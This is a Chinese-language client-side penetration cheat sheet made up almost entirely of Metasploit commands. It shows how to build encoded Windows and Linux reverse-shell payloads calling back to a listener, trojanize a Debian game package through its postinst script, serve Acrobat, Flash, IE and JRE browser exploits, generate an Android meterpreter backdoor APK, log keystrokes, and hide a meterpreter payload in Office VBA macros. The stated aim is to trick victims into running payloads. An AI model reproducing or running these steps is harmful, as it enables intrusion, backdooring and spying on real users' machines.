

# 客户端渗透

* 原理
* 诱骗被害者执行 Payload（windows）
* 诱骗被害者执行 Payload（Linux Deb安装包）
* 利用Acrobat Reader漏洞执行payload 
* 利用Flash插件漏洞执行payload
* 利用 IE 浏览器漏洞执行 payload
* 利用 JRE 漏洞执行payload
* 生成 Android 后门程序
* VBScript 感染方式


## 原理
> * 在无法突破网络边界的情况下转而攻击客户端
    - 社会工程学攻击
    - 进而渗透线上业务网络
> * 含有漏洞利用代码的WEB站点
    - 利用客户端漏洞
> * 含有漏洞利用代码的DOC、PDF文档
> * 诱骗被害者执行Payload

## 诱骗被害者执行 Payload（windows）
* msfvenom
``` 
msfvenom --payload-options -p windows/shell/reverse_tcp
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp　LHOST=1.1.1.1 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -f exe -o  1.exe
```

* msfconsole
``` 
use exploit/multi/handler
set payload windows/shell/reverse_tcp
set LHOST 1.1.1.1
set LPORT 4444
exploit
```

## 诱骗被害者执行 Payload（Linux Deb安装包）
``` 
apt-get --download-only install freesweep
dpkg -x freesweep_0.90-1_i386.deb free
mkdir free/DEBIAN && cd free/DEBIAN
vi control
vi postinst
    #!/bin/sh
    sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /usr/games/freesweep &
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp   LHOST=1.1.1.1 LPORT=4444 -b "\x00" -f elf -o /root/free/usr/games/freesweep_scores
chmod 755 postinst
dpkg-deb --build /root/free
```

## 利用Acrobat Reader漏洞执行payload 
``` 
// 利用的是Adobe Reader 8.1.2的漏洞
// 构造PDF文件
exploit/windows/fileformat/adobe_utilprintf

// 构造恶意网站
exploit/windows/browser/adobe_utilprintf

```
* Meterpreter
``` 
use priv
run post/windows/capture/keylog_recorder
```

## 利用Flash插件漏洞执行payload
``` 
use exploit/multi/browser/adobe_flash_hacking_team_uaf
use exploit/multi/browser/adobe_flash_opaque_background_uaf
use auxiliary/server/browser_autopwn2
```


## 利用 IE 浏览器漏洞执行 payload
``` 
use exploit/windows/browser/ms14_064_ole_code_execution
```

## 利用 JRE 漏洞执行payload
``` 
use exploit/multi/browser/java_jre17_driver_manager
use exploit/multi/browser/java_jre17_jmxbean
use exploit/multi/browser/java_jre17_reflection_types
```

## 生成 Android 后门程序
``` 
use payload/android/meterpreter/reverse_tcp
generate -f a.apk -p android -t raw
```

## VBScript 感染方式
``` 
// 利用 宏 感染 word、excel文档
// 绕过某些基于文件类型检查的安全机制
// 生成 vbscript 脚本
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -e x86/shikata_ga_nai  -f vba-exe

// Office 2007 +
//      视图——宏——创建
//      Payload 第一部分粘入VBA代码；
//      Payload 第二部分粘入word文档正文；
// Msf 启动侦听
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
```
